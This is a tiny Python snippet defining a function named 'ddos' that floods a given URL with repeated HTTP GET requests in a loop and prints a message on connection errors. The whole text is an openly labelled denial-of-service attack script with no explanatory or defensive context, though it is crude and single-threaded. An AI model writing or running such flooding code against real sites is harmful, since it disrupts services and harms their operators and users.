def ddos(url, w):
    try:
        import requests
        for i in range(w):
            res = requests.get(url)
    except:
        print('[+] error connect')
